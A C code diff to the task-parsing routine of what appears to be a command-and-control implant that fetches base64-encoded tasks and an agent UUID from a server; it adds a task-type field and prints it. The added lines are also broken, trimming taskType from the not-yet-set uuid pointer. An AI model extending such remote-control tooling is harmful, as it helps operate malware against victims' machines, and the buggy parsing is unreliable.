@@ -781,7 +781,7 @@ CHAR* myTrimB(PAPI api, CHAR* str, CHAR trim)
     return outStr;
 }
 
-CHAR* readJsonTask(PAPI api, CHAR* json, CHAR** taskId, CHAR** uuid)
+CHAR* readJsonTask(PAPI api, CHAR* json, CHAR** taskId, CHAR** taskType, CHAR** uuid)
 {
     CHAR* tmpJson = json;  // myStrtok modifies the string itself
     CHAR* task;
@@ -814,6 +814,9 @@ CHAR* readJsonTask(PAPI api, CHAR* json, CHAR** taskId, CHAR** uuid)
     task = myTrim(myStrtok(tmpJson, delim, FALSE), ' ');
     task = myEndTrim(task, ',');
     task = myTrim(task, '"');
+    *taskType = myTrim(myStrtok(tmpJson, delim, FALSE), ' ');
+    *taskType= myEndTrim(*uuid, ',');
+    *taskType = myTrim(*uuid, '"');
     *uuid = myTrim(myStrtok(tmpJson, delim, FALSE), ' ');
     *uuid = myEndTrim(*uuid, ',');
     *uuid = myTrim(*uuid, '"');
@@ -950,6 +953,7 @@ void myMain()
 
     CHAR* jsonResponse = NULL;
     CHAR* taskId = { 0 };
+    CHAR* taskType = { 0 };
     CHAR* agentUuid = { 0 };
     CHAR* b64Task;
     CHAR* task = NULL;
@@ -978,7 +982,9 @@ void myMain()
             continue;
         }
 
-        b64Task = readJsonTask(api, jsonResponse, &taskId, &agentUuid);
+        b64Task = readJsonTask(api, jsonResponse, &taskId, &taskType, &agentUuid);
+
+        ((PRINTF)api->printf)(taskType);
 
         if (b64Task == NULL)
         {
